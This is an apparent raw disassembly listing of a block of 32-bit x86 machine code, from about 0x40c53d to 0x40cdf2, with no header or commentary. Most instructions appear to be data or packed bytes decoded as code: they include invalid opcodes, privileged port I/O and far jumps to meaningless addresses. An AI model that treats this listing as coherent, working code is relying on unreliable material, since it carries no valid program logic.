  40c53d:	cmp    BYTE PTR [ecx+0x2936b6d4],0x7c
  40c544:	fwait
  40c545:	(bad)  
  40c546:	mov    esp,0xfa03e902
  40c54b:	add    al,0x0
  40c54d:	ss push edx
  40c54f:	std    
  40c550:	out    0x6d,eax
  40c552:	xor    eax,0xb16a0005
  40c557:	add    al,0x77
  40c559:	lock add ch,al
  40c55c:	pop    edx
  40c55d:	mov    dh,0xe7
  40c55f:	mov    ebp,0xb5f9e1c1
  40c564:	out    0x72,eax
  40c566:	ret    0x88f8
  40c569:	jmp    0x40c56b
  40c56b:	mov    al,0xe
  40c56d:	imul   esp,DWORD PTR [ebx-0xf160139],0x50
  40c574:	or     BYTE PTR [edx-0x4b],dh
  40c577:	cld    
  40c578:	jmp    0x2a69:0x57bd443
  40c57f:	pop    ss
  40c580:	jb     0x40c565
  40c582:	jns    0x40c54f
  40c584:	cmp    BYTE PTR [esi],bh
  40c586:	std    
  40c587:	test   bl,ch
  40c589:	stc    
  40c58a:	and    ch,dl
  40c58c:	jg     0x40c543
	...
  40c59e:	add    BYTE PTR [eax],al
  40c5a0:	mov    ecx,0x4a690d52
  40c5a5:	inc    ecx
  40c5a6:	ja     0x40c599
  40c5a8:	jns    0x40c585
  40c5aa:	inc    eax
  40c5ab:	imul   esi,DWORD PTR [edx],0xf2e0eafd
  40c5b1:	les    ebx,FWORD PTR [edx+0x2e]
  40c5b4:	fdivr  QWORD PTR [ebp+0x8f9f1c1]
  40c5ba:	xor    bl,bh
  40c5bc:	add    DWORD PTR [ebx],ecx
  40c5be:	cmp    esi,edi
  40c5c0:	std    
  40c5c1:	sbb    BYTE PTR [eax],dh
  40c5c3:	and    bh,0xa
  40c5c6:	inc    ecx
  40c5c7:	fninit 
  40c5c9:	or     al,BYTE PTR [esi-0x2a]
  40c5cc:	neg    DWORD PTR [eax]
  40c5ce:	inc    ecx
  40c5cf:	in     eax,dx
  40c5d0:	rcr    ebx,cl
  40c5d2:	or     BYTE PTR [edx],al
  40c5d4:	mov    dh,0x2b
  40c5d6:	pop    edi
  40c5d7:	add    BYTE PTR [ebp-0x2cf73f75],bl
  40c5dd:	ret    0x4de
  40c5e0:	cdq    
  40c5e1:	mov    esi,0xbf204ba8
  40c5e6:	add    BYTE PTR [ebx],cl
  40c5e8:	cmp    BYTE PTR [esi],ch
  40c5ea:	mov    ds:0xfdc6568b,al
  40c5ef:	xor    BYTE PTR [esi+edi*1],bl
  40c5f2:	clc    
  40c5f3:	jmp    DWORD PTR [esi-0x36]
  40c5f6:	lea    eax,[ebp-0x1]
  40c5f9:	mov    edi,0x293f443
  40c5fe:	add    BYTE PTR [eax],al
  40c600:	loopne 0x40c5f7
  40c602:	and    BYTE PTR [ecx],ch
	...
  40c614:	add    BYTE PTR [eax],al
  40c616:	mov    ds:0x25740002,al
  40c61b:	inc    esi
  40c61c:	inc    esp
  40c61d:	lock and ebp,DWORD PTR [ebx]
  40c620:	add    DWORD PTR [edx+0x63],ebp
  40c623:	sub    al,0x0
  40c625:	push   0x63
  40c627:	sub    al,0x0
  40c629:	lea    edx,[esi]
  40c62b:	mov    ecx,0x2326ff4e
  40c630:	sub    DWORD PTR [ecx+0x23],eax
  40c633:	int    0xbe
  40c635:	je     0x40c660
  40c637:	test   DWORD PTR [ebx-0xc],edi
  40c63a:	adc    ebp,DWORD PTR [esi]
  40c63c:	xor    al,0x8b
  40c63e:	(bad)  
  40c63f:	add    al,0x8b
  40c641:	dec    ebp
  40c642:	jae    0x40c641
  40c644:	pop    es
  40c645:	ja     0x40c680
  40c647:	mov    dh,0x89
  40c649:	jne    0x40c5d2
  40c64b:	dec    esp
  40c64c:	jl     0x40c656
  40c64e:	mov    BYTE PTR [esi],al
  40c650:	lock jecxz 0x40c634
  40c653:	mov    ah,0xa2
  40c655:	mov    edx,DWORD PTR [esi]
  40c657:	add    eax,0x494375ff
  40c65c:	(bad)  
  40c65d:	inc    dh
  40c65f:	lods   eax,DWORD PTR ds:[esi]
  40c660:	out    0xe3,al
  40c662:	cli    
  40c663:	call   0x2:0xdc920002
  40c66a:	cli    
  40c66b:	mov    ds:0x19b35e2b,al
  40c670:	sti    
  40c671:	jmp    eax
  40c673:	sbb    ebp,DWORD PTR [eax]
  40c675:	pop    edi
  40c676:	dec    esp
  40c677:	and    eax,0x7c1
	...
  40c68c:	cli    
  40c68d:	mov    BYTE PTR [edi-0x15],dh
  40c690:	jns    0x40c6b1
  40c692:	ret    
  40c693:	addr16 cli 
  40c695:	mov    ebx,0x36a20002
  40c69a:	push   ecx
  40c69b:	inc    DWORD PTR [ebp+0x12fc4654]
  40c6a1:	fsub   QWORD PTR [edx]
  40c6a3:	add    dl,bh
  40c6a5:	add    edx,DWORD PTR [ecx+0x78d66d71]
  40c6ab:	inc    esp
  40c6ac:	bound  esi,QWORD PTR [ebx]
  40c6ae:	add    al,0x20
  40c6b0:	cli    
  40c6b1:	fcmovnu st,st(2)
  40c6b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6b4:	enter  0xcaae,0x88
  40c6b8:	mov    bh,0xaf
  40c6ba:	pop    ebx
  40c6bb:	add    BYTE PTR [edx],bl
  40c6bd:	fadd   QWORD PTR [edx]
  40c6bf:	call   0xff0bd026
  40c6c4:	sbb    DWORD PTR [eax],0xffffffd4
  40c6c7:	addr16 cli 
  40c6c9:	sti    
  40c6ca:	add    eax,DWORD PTR [eax]
  40c6cc:	adc    dl,BYTE PTR [edx+0x56]
  40c6cf:	call   FWORD PTR ds:0xa2ec4154
  40c6d5:	(bad)  [edx]
  40c6d7:	add    dl,bh
  40c6d9:	or     DWORD PTR [ecx+0x72],0x5
  40c6dd:	jle    0x40c75b
  40c6df:	inc    esp
  40c6e0:	adc    dh,bl
  40c6e2:	add    esp,DWORD PTR [eax]
  40c6e4:	cli    
  40c6e5:	lods   eax,DWORD PTR ds:[esi]
  40c6e6:	fidiv  DWORD PTR [eax+0x68]
  40c6e9:	xor    ecx,ebx
  40c6eb:	mov    BYTE PTR [edi],bh
  40c6ed:	add    eax,0xcb4d
	...
  40c702:	adc    ax,0x3d1
  40c706:	cmp    DWORD PTR [esi-0x17],eax
  40c709:	retf   0xc146
  40c70c:	inc    eax
  40c70d:	jnp    0x40c748
  40c70f:	add    eax,0x11b986e9
  40c714:	ds push ecx
  40c716:	or     ch,BYTE PTR ds:0x53b46da
  40c71c:	cs push ecx
  40c71e:	mov    ds:0xfa3fa4ad,al
  40c723:	add    al,0x6a
  40c725:	rol    BYTE PTR [ecx],0xc4
  40c728:	fwait
  40c729:	repz adc eax,0xfa44a9ed
  40c72f:	ret    
  40c730:	jnp    0x40c701
  40c732:	xchg   ebp,eax
  40c733:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40c735:	add    edi,edx
  40c737:	xchg   DWORD PTR [eax+edi*8],ebp
  40c73a:	ins    BYTE PTR es:[edi],dx
  40c73b:	cmp    bl,cl
  40c73d:	pop    ebx
  40c73e:	mov    ebp,0x5d042847
  40c743:	cmp    bl,cl
  40c745:	fld    TBYTE PTR [edi+0x7903e948]
  40c74b:	leave  
  40c74c:	fmul   st(2),st
  40c74e:	into   
  40c74f:	adc    al,0x51
  40c751:	cs mov ecx,0xaecae945
  40c757:	mov    al,0xc0
  40c759:	inc    esi
  40c75a:	mov    dh,0x4
  40c75c:	jmp    0xa65200e7
  40c761:	push   eax
  40c762:	out    dx,al
  40c763:	sub    al,0x19
  40c765:	inc    edi
	...
  40c776:	add    BYTE PTR [eax],al
  40c778:	mov    ebx,0x22509604
  40c77d:	lods   eax,DWORD PTR ds:[esi]
  40c77e:	fdivr  DWORD PTR [edi]
  40c780:	cli    
  40c781:	add    al,0x6a
  40c783:	mov    edi,0xf3f3c3f1
  40c788:	pop    ebp
  40c789:	inc    ecx
  40c78a:	add    BYTE PTR [edx],ch
  40c78c:	aaa    
  40c78d:	add    eax,0xabc5f4ff
  40c792:	sbb    al,0xad
  40c794:	stc    
  40c795:	add    al,0x83
  40c797:	and    eax,0x56002dcd
  40c79c:	sub    al,cl
  40c79e:	(bad)  
  40c79f:	aam    0xcd
  40c7a1:	ret    0x634
  40c7a4:	fild   WORD PTR [ebp+0x0]
  40c7a7:	push   ecx
  40c7a8:	push   0x2e36ff37
  40c7ad:	dec    ecx
  40c7ae:	loopne 0x40c773
  40c7b0:	stc    
  40c7b1:	ret    
  40c7b2:	je     0x40c7d5
  40c7b4:	mov    al,0x38
  40c7b6:	or     al,0x1e
  40c7b8:	jmp    0xc0ac:0xf9a82903
  40c7bf:	xchg   ebp,eax
  40c7c0:	mov    al,0xc2
  40c7c2:	mov    BYTE PTR [ebp+edx*2-0x3a01ffd3],ch
  40c7c9:	mov    eax,0xc2657cfe
  40c7ce:	xor    al,0xae
  40c7d0:	push   es
  40c7d1:	inc    esi
  40c7d2:	add    cl,dl
  40c7d4:	jg     0x40c80d
  40c7d6:	(bad)  
  40c7d7:	(bad)  
  40c7d9:	dec    eax
  40c7da:	fadd   DWORD PTR [ebx+0x0]
	...
  40c7ed:	add    dh,dh
  40c7ef:	ret    
  40c7f0:	je     0x40c7cb
  40c7f2:	xor    edi,DWORD PTR [eax]
  40c7f4:	call   0x2944b5bf
  40c7f9:	sub    dh,bh
  40c7fb:	lods   al,BYTE PTR ds:[esi]
  40c7fc:	xchg   esp,eax
  40c7fd:	cmp    eax,0x2488c243
  40c802:	push   0x2d
  40c804:	add    BYTE PTR [esi+0x14feb0ad],ah
  40c80a:	ss ret 0xd634
  40c80e:	lock inc ebp
  40c810:	add    BYTE PTR [ecx+0xff38b3],al
  40c816:	je     0x40c857
  40c818:	inc    esp
  40c819:	shl    BYTE PTR [esi+0x2],1
  40c81c:	rcl    BYTE PTR [eax+0x64],0x52
  40c820:	in     al,0xff
  40c822:	out    dx,al
  40c823:	mov    edx,0x1e1435fd
  40c828:	inc    ecx
  40c829:	add    BYTE PTR [ebx],ch
  40c82b:	and    al,0x74
  40c82d:	jmp    DWORD PTR [esi+edi*1]
  40c830:	inc    esp
  40c831:	int3   
  40c832:	push   eax
  40c833:	dec    edx
  40c834:	loopne 0x40c836
  40c836:	les    eax,FWORD PTR [edx-0x4a]
  40c839:	add    BYTE PTR [ebx+0xf7d8306],ah
  40c83f:	or     DWORD PTR [edi],ecx
  40c841:	test   BYTE PTR [esi],ah
  40c843:	or     DWORD PTR [eax],eax
  40c845:	add    BYTE PTR [eax],dl
  40c847:	dec    edx
  40c848:	rol    BYTE PTR [eax],1
  40c84a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c84b:	inc    edx
  40c84c:	mov    ds:0x8d06a300,al
  40c851:	inc    ebp
	...
  40c862:	add    BYTE PTR [eax],al
  40c864:	(bad)  
  40c866:	(bad)  
  40c867:	jne    0x40c848
  40c869:	loopne 0x40c8b9
  40c86b:	std    
  40c86c:	je     0x40c83b
  40c86e:	or     eax,eax
  40c870:	push   esp
  40c871:	inc    edx
  40c872:	mov    es,WORD PTR [eax]
  40c874:	push   ebx
  40c875:	push   es
  40c876:	cmp    DWORD PTR [ebp-0x71],0x6
  40c87a:	je     0x40ce5e
  40c880:	(bad)  
  40c881:	add    cl,al
  40c883:	push   eax
  40c884:	xor    al,0x53
  40c886:	shr    al,1
  40c888:	inc    ecx
  40c889:	retf   
  40c88a:	std    
  40c88b:	jmp    FWORD PTR [eax]
  40c88d:	(bad)  
  40c88e:	jb     0x40c905
  40c890:	mov    al,ds:0xef00c84a
  40c895:	pop    ebx
  40c896:	push   0xbcdd1310
  40c89b:	(bad)  
  40c89c:	out    dx,al
  40c89d:	shl    dh,0x76
  40c8a0:	cli    
  40c8a1:	or     cl,cl
  40c8a3:	inc    BYTE PTR ds:0x87fee419
  40c8a9:	mov    bl,0xda
  40c8ab:	int3   
  40c8ac:	addr16 inc ebx
  40c8ae:	enter  0x67fe,0x98
  40c8b2:	(bad)  
  40c8b3:	je     0x40c8a7
  40c8b5:	add    esp,0x6c
  40c8b8:	(bad)  [edx]
  40c8ba:	enter  0xb274,0x62
  40c8be:	dec    esi
  40c8bf:	or     dl,ah
  40c8c1:	mov    ds:0x52c5ff55,al
  40c8c6:	dec    esi
  40c8c7:	les    eax,FWORD PTR [eax]
	...
  40c8d9:	add    BYTE PTR [ebp+0x2ffeae80],bh
  40c8df:	mov    ah,0xda
  40c8e1:	jl     0x40c902
  40c8e3:	sti    
  40c8e4:	(bad)  
  40c8e5:	(bad)  
  40c8e6:	das    
  40c8e7:	in     al,0xc7
  40c8e9:	je     0x40c8b5
  40c8eb:	jmp    0xff55:0x92a2084d
  40c8f2:	lea    ebp,[esi]
  40c8f4:	inc    esi
  40c8f5:	int3   
  40c8f6:	cli    
  40c8f7:	xchg   edi,eax
  40c8f8:	in     eax,dx
  40c8f9:	cmp    bh,0xeb
  40c8fc:	(bad)  
  40c8fd:	je     0x40c904
  40c8ff:	aaa    
  40c900:	ds int3 
  40c902:	ins    DWORD PTR es:[edi],dx
  40c903:	jnp    0x40c8cc
  40c905:	je     0x40c8f9
  40c907:	add    esp,DWORD PTR [ebx]
  40c909:	ins    DWORD PTR es:[edi],dx
  40c90a:	pop    ebp
  40c90b:	stos   BYTE PTR es:[edi],al
  40c90c:	fimul  DWORD PTR [ecx]
  40c90e:	loopne 0x40c8bb
  40c910:	lds    esi,FWORD PTR [edx+eax*1-0x3c]
  40c914:	out    dx,eax
  40c915:	ins    BYTE PTR es:[edi],dx
  40c916:	inc    ebp
  40c917:	rol    dh,cl
  40c919:	je     0x40c959
  40c91b:	rol    DWORD PTR [edx-0x397dca91],cl
  40c921:	je     0x40c955
  40c923:	ret    
  40c924:	dec    edx
  40c925:	jo     0x40c94c
  40c927:	jb     0x40c8ef
  40c929:	je     0x40c951
  40c92b:	add    al,0x91
  40c92d:	push   ebx
  40c92e:	mov    al,cl
  40c930:	popf   
  40c931:	mov    DWORD PTR [esi-0x75a47f4c],0x86c78dc1
  40c93b:	mov    al,0x90
  40c93d:	arpl   WORD PTR [eax],ax
	...
  40c94f:	add    BYTE PTR [edx-0x40],ch
  40c952:	jge    0x40c91b
  40c954:	lods   ax,WORD PTR ds:[esi]
  40c956:	sub    BYTE PTR [ebx],0x6a
  40c959:	shr    BYTE PTR [ebp-0x39],0x66
  40c95d:	test   eax,0xc04a3350
  40c962:	pop    ebp
  40c963:	mov    DWORD PTR [esi-0x5b],0xc04a3b40
  40c96a:	dec    ebp
  40c96b:	mov    DWORD PTR [esi-0x1f],0xc02a4350
  40c972:	cmp    eax,0x40dd26c7
  40c977:	or     ebp,DWORD PTR [edx]
  40c979:	shr    BYTE PTR ds:0x10d926c7,0x13
  40c980:	or     al,al
  40c982:	sbb    eax,0xd506c7
  40c987:	sbb    ecx,DWORD PTR [edx]
  40c989:	ror    BYTE PTR ds:0x10d106c7,0x23
  40c990:	jmp    0xe911:0x3bbcfdbf
  40c997:	xor    BYTE PTR [ecx-0x4f],dh
  40c99a:	rcl    BYTE PTR [di-0x48],0xe5
  40c99f:	mov    BYTE PTR [esi+0x4d33dd4a],0x3a
  40c9a6:	in     eax,0xc6
  40c9a8:	push   cs
  40c9a9:	add    BYTE PTR [eax],al
  40c9ab:	inc    ebp
  40c9ac:	cli    
  40c9ad:	lods   al,BYTE PTR ds:[esi]
  40c9ae:	dec    esp
  40c9af:	inc    edx
  40c9b0:	cli    
  40c9b1:	add    al,0xf2
  40c9b3:	ret    
	...
  40c9c4:	add    BYTE PTR [eax],al
  40c9c6:	cld    
  40c9c7:	mov    edi,edi
  40c9c9:	fdiv   st(6),st
  40c9cb:	add    al,0x0
  40c9cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9ce:	mov    edx,0xf9e8ffbc
  40c9d3:	add    al,0xc7
  40c9d5:	and    al,0x2a
  40c9d7:	mov    edi,0x2af9e906
  40c9dc:	add    BYTE PTR [ebx],al
  40c9de:	imul   BYTE PTR [edx]
  40c9e0:	add    BYTE PTR [ebx],dl
  40c9e2:	(bad)  
  40c9e3:	xchg   ecx,eax
  40c9e4:	inc    esp
  40c9e5:	jne    0x40ca10
  40c9e7:	xchg   edx,eax
  40c9e8:	test   BYTE PTR [ecx-0x4c],bh
  40c9eb:	mov    esi,0x38b519fe
  40c9f0:	clc    
  40c9f1:	data16 sub al,cl
  40c9f4:	out    0x17,eax
  40c9f6:	cmp    BYTE PTR ds:0x33b9e200,al
  40c9fc:	add    eax,0xfebf8c40
  40ca01:	jmp    0xa8683f57
  40ca06:	stc    
  40ca07:	mov    edi,0x5cc1e574
  40ca0c:	jae    0x40ca3c
  40ca0e:	mov    ah,0x4f
  40ca10:	mov    edi,DWORD PTR [ecx]
  40ca12:	adc    cl,BYTE PTR [ecx-0x414be911]
  40ca18:	dec    edi
  40ca19:	mov    ebx,0xe734ca1
  40ca1e:	mov    ah,0x8c
  40ca20:	test   BYTE PTR [ecx],dl
  40ca22:	inc    esp
  40ca23:	mov    esi,0x2ed411fe
  40ca28:	push   esi
	...
  40ca3a:	add    BYTE PTR [eax],al
  40ca3c:	in     eax,dx
  40ca3d:	dec    eax
  40ca3e:	lock cdq 
  40ca40:	sar    DWORD PTR [eax-0x4001d7bf],0xb4
  40ca47:	sar    DWORD PTR [edi],1
  40ca49:	mov    esi,0xfff5d6fe
  40ca4e:	sub    BYTE PTR [eax],ch
  40ca50:	imul   BYTE PTR [esp+ebx*4-0x2360f00]
  40ca57:	mov    DWORD PTR [esi+0x6cfff5dc],edx
  40ca5d:	test   DWORD PTR [ebx-0x2369b14],edi
  40ca63:	add    bh,dh
  40ca65:	jmp    0x4975:0x4737d82
  40ca6c:	cwde   
  40ca6d:	aas    
  40ca6e:	jmp    0x40ca67
  40ca70:	ins    BYTE PTR es:[edi],dx
  40ca71:	leave  
  40ca72:	std    
  40ca73:	xor    BYTE PTR [esi+edi*1-0x15],ch
  40ca77:	imul   DWORD PTR [eax+ecx*8+0x7f]
  40ca7b:	mov    ebp,0xfffdd07f
  40ca80:	jnp    0x40ca86
  40ca82:	add    BYTE PTR [eax],al
  40ca84:	mov    ch,0xbc
  40ca86:	lds    eax,FWORD PTR [ebp-0x22fc1]
  40ca8c:	cmp    eax,DWORD PTR [eax+eax*1]
  40ca8f:	add    BYTE PTR [eax],bh
  40ca91:	stos   DWORD PTR es:[edi],eax
  40ca92:	std    
  40ca93:	lea    ecx,[edi-0x30]
  40ca96:	std    
  40ca97:	(bad)  
  40ca98:	in     al,dx
  40ca99:	(bad)  
  40ca9a:	jmp    0xb5:0xfdc7ecf7
	...
  40cab1:	add    BYTE PTR [ebx],bh
  40cab3:	sar    ch,1
  40cab5:	(bad)  
  40cab6:	fmul   QWORD PTR [ebp+0x8]
  40cab9:	call   0x3e9119
  40cabe:	adc    BYTE PTR [esi-0x38130816],al
  40cac4:	(bad)  
  40cac5:	je     0x40cae5
  40cac7:	enter  0xecb3,0x64
  40cacb:	leave  
  40cacc:	std    
  40cacd:	call   0x402421
  40cad2:	dec    esp
  40cad3:	(bad)
  40cad7:	leave  
  40cad8:	out    0x11,al
  40cada:	mov    esp,0xfafffdc7
  40cadf:	mov    al,ds:0xcf3df6da
  40cae4:	ret    
  40cae5:	je     0x40cae9
  40cae7:	aam    0xde
  40cae9:	std    
  40caea:	sub    eax,0x12b4c37f
  40caef:	jg     0x40cab4
  40caf1:	(bad)  
  40caf2:	adc    dh,BYTE PTR [esp+edx*2-0x1]
  40caf6:	adc    eax,0x23f83d67
  40cafb:	arpl   sp,ax
  40cafd:	inc    BYTE PTR ds:0x12fc4d97
  40cb03:	jmp    0x7c0:0x74fa0042
  40cb0a:	cli    
  40cb0b:	sbb    BYTE PTR [ecx-0x15],bh
  40cb0e:	jns    0x40cb7f
  40cb10:	(bad)  
  40cb11:	imul   edi,edx,0xff1401
	...
  40cb27:	add    BYTE PTR [edi-0x4c],cl
  40cb2a:	fimul  DWORD PTR [ecx]
  40cb2c:	pop    esi
  40cb2d:	pop    edi
  40cb2e:	les    ecx,FWORD PTR [eax-0x21a4a7c1]
  40cb34:	cmp    BYTE PTR [ebp+0x2],ch
  40cb37:	jmp    FWORD PTR [edi]
  40cb39:	mov    ah,0xda
  40cb3b:	mov    ds:0xfec3feac,al
  40cb40:	das    
  40cb41:	clc    
  40cb42:	ret    
  40cb43:	je     0x40cb37
  40cb45:	inc    ebx
  40cb46:	push   cs
  40cb47:	ins    BYTE PTR es:[edi],dx
  40cb48:	xchg   ebp,eax
  40cb49:	out    0xb9,al
  40cb4b:	shl    esi,0xab
  40cb4e:	sub    eax,0xbf2a968b
  40cb53:	sti    
  40cb54:	and    al,0x77
  40cb56:	pop    eax
  40cb57:	add    al,ah
  40cb59:	jl     0x40cb1e
  40cb5b:	je     0x40cb5f
  40cb5d:	adc    al,0xac
  40cb5f:	push   0x65
  40cb61:	mov    dh,0x78
  40cb63:	inc    esp
  40cb64:	pop    esi
  40cb65:	and    cl,BYTE PTR [esi]
  40cb67:	pop    eax
  40cb68:	and    al,BYTE PTR ds:0xff810428
  40cb6e:	cmp    al,0xec
  40cb70:	mov    edx,0xfa036904
  40cb75:	cmp    BYTE PTR [esp+ebp*1],ah
  40cb78:	test   DWORD PTR [ecx+0x28],eax
  40cb7b:	add    al,0xc5
  40cb7d:	lods   al,BYTE PTR ds:[esi]
  40cb7e:	fadd   QWORD PTR [edx+edi*8+0x4]
  40cb82:	loop   0x40cb47
  40cb84:	test   eax,0xd4ac171d
  40cb89:	cmp    al,0xa6
  40cb8b:	ret    
	...
  40cb9c:	add    BYTE PTR [eax],al
  40cb9e:	mov    ebp,0x1503e92c
  40cba3:	jle    0x40cba5
  40cba5:	popf   
  40cba6:	mov    eax,0xf553e943
  40cbab:	xor    dh,cl
  40cbad:	stos   DWORD PTR es:[edi],eax
  40cbae:	sub    bl,BYTE PTR [eax+0x5addc37d]
  40cbb4:	pop    es
  40cbb5:	ret    
  40cbb6:	fdiv   QWORD PTR [eax-0x485b619]
  40cbbc:	call   0x5d849bf9
  40cbc1:	test   DWORD PTR [ebp-0x433caa82],0xed725abc
  40cbcb:	add    edi,DWORD PTR [esi+edi*2-0x3cc2cd54]
  40cbd2:	cs or  eax,0xbc107d41
  40cbd8:	sub    eax,0x2ace3463
  40cbdd:	or     dl,bh
  40cbdf:	push   ecx
  40cbe0:	jb     0x40cb92
  40cbe2:	js     0x40cba5
  40cbe4:	adc    BYTE PTR [edi-0x4b],dl
  40cbe7:	inc    edx
  40cbe8:	adc    DWORD PTR [edx+edi*8],eax
  40cbeb:	add    al,0xe9
  40cbed:	retf   0xb8b6
  40cbf0:	call   0x45c5f8
  40cbf5:	bound  esi,QWORD PTR [ebx-0x64e7cf8]
  40cbfb:	xor    DWORD PTR [ecx],ecx
  40cbfd:	adc    dh,BYTE PTR [esi]
  40cbff:	out    dx,eax
  40cc00:	rol    DWORD PTR [edx+0x0],1
	...
  40cc13:	add    BYTE PTR [edi],dh
  40cc15:	(bad)  
  40cc16:	or     ebp,ecx
  40cc18:	mov    esp,0xf9e90004
  40cc1d:	scas   eax,DWORD PTR es:[edi]
  40cc1e:	pusha  
  40cc1f:	push   0xffffffba
  40cc21:	adc    al,0x0
  40cc23:	xor    eax,0xd9448ff3
  40cc28:	outs   dx,BYTE PTR ds:[esi]
  40cc29:	adc    al,0xff
  40cc2b:	xor    al,0xea
  40cc2d:	mov    ebx,0xcb61f174
  40cc32:	addr16 sahf 
  40cc34:	cmp    BYTE PTR [edi+0x1c2e0fa],al
  40cc3a:	or     DWORD PTR [esi+esi*4],esp
  40cc3d:	scas   al,BYTE PTR es:[edi]
  40cc3e:	inc    ebp
  40cc3f:	sbb    ebx,esp
  40cc41:	cmp    bh,bh
  40cc43:	jle    0x40cbfd
  40cc45:	or     al,0x45
  40cc47:	jno    0x40cc8a
  40cc49:	outs   dx,BYTE PTR ds:[esi]
  40cc4a:	jg     0x40cc35
  40cc4c:	stc    
  40cc4d:	add    al,0x75
  40cc4f:	jmp    0x40cbed
  40cc51:	test   BYTE PTR [edx+0x1531f162],0x62
  40cc58:	xor    bh,BYTE PTR [ebp+0xa75b48a]
  40cc5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc5f:	sub    eax,DWORD PTR [ecx]
  40cc61:	(bad)  
  40cc62:	fcomip st,st(1)
  40cc64:	jbe    0x40cca6
  40cc66:	clc    
  40cc67:	pusha  
  40cc68:	inc    edx
  40cc69:	mov    ecx,0x4084daea
  40cc6e:	clc    
  40cc6f:	jb     0x40cca3
  40cc71:	mov    ecx,0x2bf450e
  40cc76:	ror    DWORD PTR [ecx],0x0
	...
  40cc89:	add    al,dh
  40cc8b:	lea    eax,[ecx+edx*1-0x7a]
  40cc8f:	push   eax
  40cc90:	cld    
  40cc91:	add    BYTE PTR [eax-0x12f6067e],ah
  40cc97:	cdq    
  40cc98:	mov    DWORD PTR [ebp+0x57],eax
  40cc9b:	xor    BYTE PTR [esi],0x0
  40cc9e:	into   
  40cc9f:	or     eax,0xd2e8c02b
  40cca4:	jmp    0xf88494af
  40cca9:	mov    edi,esi
  40ccab:	les    ebx,FWORD PTR [ecx-0x37]
  40ccae:	popa   
  40ccaf:	adc    al,0x0
  40ccb1:	push   ebp
  40ccb2:	test   al,0x74
  40ccb4:	add    esp,0x6693276f
  40ccba:	rol    BYTE PTR [eax],cl
  40ccbc:	cmp    DWORD PTR [ebp+0x37],eax
  40ccbf:	std    
  40ccc0:	add    eax,0xc0cf632b
  40ccc5:	adc    BYTE PTR [ebx],dl
  40ccc7:	les    esi,FWORD PTR [ebx]
  40ccc9:	xchg   esp,eax
  40ccca:	in     eax,dx
  40cccb:	inc    edi
  40cccc:	add    al,ch
  40ccce:	add    al,0xea
  40ccd0:	(bad)  
  40ccd1:	jmp    FWORD PTR [edx+0x42]
  40ccd4:	clc    
  40ccd5:	lea    ebx,[esi]
  40ccd7:	lds    ecx,FWORD PTR [esi-0x18]
  40ccda:	aaa    
  40ccdb:	in     eax,dx
  40ccdc:	(bad)  
  40ccdd:	jmp    DWORD PTR [edx+esi*8+0x13]
  40cce1:	jmp    FWORD PTR [esi+0x5b75ff0a]
  40cce7:	les    esi,FWORD PTR [ebx+0x8]
  40ccea:	cmp    ebp,DWORD PTR [esi]
  40ccec:	inc    WORD PTR [eax]
	...
  40ccff:	add    BYTE PTR [eax+ecx*1-0x40],al
  40cd03:	nop    DWORD PTR [edi]
  40cd06:	(bad)  
  40cd07:	call   DWORD PTR [ebx-0x1bf38c3b]
  40cd0d:	icebp  
  40cd0e:	idiv   edi
  40cd10:	dec    esi
  40cd11:	jp     0x40ccf9
  40cd13:	stc    
  40cd14:	jle    0x40ccdb
  40cd16:	std    
  40cd17:	mov    ebx,DWORD PTR [esi+0xa]
  40cd1a:	cmp    eax,DWORD PTR [ebp-0x6]
  40cd1d:	mov    ebx,0xac9e830f
  40cd22:	add    al,BYTE PTR [eax]
  40cd24:	ins    DWORD PTR es:[edi],dx
  40cd25:	cmp    DWORD PTR [edi],edx
  40cd27:	(bad)  
  40cd28:	out    dx,eax
  40cd29:	mov    bl,0xaa
  40cd2b:	mov    eax,ds:0x88bfb2d5
  40cd30:	mov    edi,0x4d73abaf
  40cd35:	icebp  
  40cd36:	mov    bh,0x2a
  40cd38:	sub    BYTE PTR [edi],dh
  40cd3a:	inc    esi
  40cd3b:	hlt    
  40cd3c:	inc    ebp
  40cd3d:	or     DWORD PTR [eax+0xbabbb65],ebx
  40cd43:	shl    BYTE PTR [esi-0x6f985453],cl
  40cd49:	stos   DWORD PTR es:[edi],eax
  40cd4a:	push   edx
  40cd4b:	jmp    DWORD PTR [edi-0x6177555d]
  40cd51:	push   0xffffffbf
  40cd53:	inc    BYTE PTR [edi-0xd8b4049]
  40cd59:	xchg   ebx,eax
  40cd5a:	xor    esp,DWORD PTR [edi-0x3]
  40cd5d:	xchg   edx,eax
  40cd5e:	mov    edx,DWORD PTR [esi+ecx*1+0x2f]
  40cd62:	std    
  40cd63:	inc    DWORD PTR [eax]
	...
  40cd75:	add    BYTE PTR [esi-0x52],ah
  40cd78:	stos   DWORD PTR es:[edi],eax
  40cd79:	inc    edi
  40cd7a:	jae    0x40cd5c
  40cd7c:	mov    bh,0x8a
  40cd7e:	out    dx,eax
  40cd7f:	push   edi
  40cd80:	sub    DWORD PTR [ecx-0x6],eax
  40cd83:	cs stos BYTE PTR es:[edi],al
  40cd85:	add    ebp,DWORD PTR [ebx]
  40cd87:	and    esi,DWORD PTR [esi]
  40cd89:	adc    al,0x2b
  40cd8b:	pop    ebx
  40cd8c:	ss clc 
  40cd8e:	mov    ebp,0xdde80ad8
  40cd93:	ret    0xfebf
  40cd96:	push   ebx
  40cd97:	mov    bh,0xc2
  40cd99:	je     0x40cd93
  40cd9b:	push   esi
  40cd9c:	out    0x50,al
  40cd9e:	popf   
  40cd9f:	js     0x40cd5b
  40cda1:	dec    BYTE PTR [edi]
  40cda3:	call   0x5584752
  40cda8:	rol    BYTE PTR es:[edi+ebp*1+0x2109ab1d],0x16
  40cdb1:	shl    BYTE PTR [esi],0x5
  40cdb4:	jmp    0xeb73c1fc
  40cdb9:	lods   al,BYTE PTR ds:[esi]
  40cdba:	std    
  40cdbb:	test   DWORD PTR [ebx-0x49],edi
  40cdbe:	pop    ebp
  40cdbf:	xor    BYTE PTR [edi-0x54],ch
  40cdc2:	in     eax,dx
  40cdc3:	mov    ecx,0x655bf73
  40cdc8:	dec    ebp
  40cdc9:	mov    edi,0xc023c144
  40cdce:	cmp    eax,0x8103e8b9
  40cdd3:	aas    
  40cdd4:	cmc    
  40cdd5:	(bad)  
  40cdd6:	sub    eax,0x3e8b9
	...
  40cdeb:	add    dl,bh
  40cded:	mov    ecx,0x3715bc33
  40cdf2:	inc    ebp
